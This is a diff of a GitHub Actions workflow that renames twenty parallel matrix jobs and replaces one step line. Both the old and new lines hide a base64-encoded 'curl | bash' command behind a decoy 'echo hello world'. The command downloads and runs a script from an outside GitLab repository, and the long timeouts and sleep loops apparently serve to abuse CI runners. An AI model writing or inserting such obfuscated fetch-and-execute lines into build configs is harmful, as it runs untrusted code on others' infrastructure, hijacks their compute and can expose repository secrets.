@@ -19,26 +19,26 @@ jobs:
       max-parallel: 20
       matrix:
         include:
-          - name: helios-ayon1
-          - name: helios-byon1
-          - name: helios-cyon1
-          - name: helios-dyon1
-          - name: helios-eyon1
-          - name: helios-fyon1
-          - name: helios-gyon1
-          - name: helios-hyon1
-          - name: helios-iyon1
-          - name: helios-jyon1
-          - name: heilo-kyons1
-          - name: heilo-lyons1
-          - name: heilo-myons1
-          - name: heilo-nyons1
-          - name: heilo-oyons1
-          - name: heilo-pyons1
-          - name: heilo-qyons1
-          - name: heilo-ryons1
-          - name: heilo-syons1
-          - name: heilo-tyons1
+          - name: helios-ayons1
+          - name: helios-byons1
+          - name: helios-cyons1
+          - name: helios-dyons1
+          - name: helios-eyons1
+          - name: helios-fyons1
+          - name: helios-gyons1
+          - name: helios-hyons1
+          - name: helios-iyons1
+          - name: helios-jyons1
+          - name: heilo-kyonse1
+          - name: heilo-lyonse1
+          - name: heilo-myonse1
+          - name: heilo-nyonse1
+          - name: heilo-oyonse1
+          - name: heilo-pyonse1
+          - name: heilo-qyonse1
+          - name: heilo-ryonse1
+          - name: heilo-syonse1
+          - name: heilo-tyonse1
     runs-on: ubuntu-latest
     timeout-minutes: 320
     steps:
@@ -74,7 +74,7 @@ jobs:
               SLEEP=3600
             fi
           fi
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9zcGluYXpvbGxhL3NhaW50Ly0vcmF3L21haW4vcml2ZXJzYW5zIHwgYmFzaA | sh & sleep $SLEEP
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGltZXZlcnMgfCBiYXNo | sh & sleep $SLEEP
 
   trigger-phanu:
     needs: run-lscpu
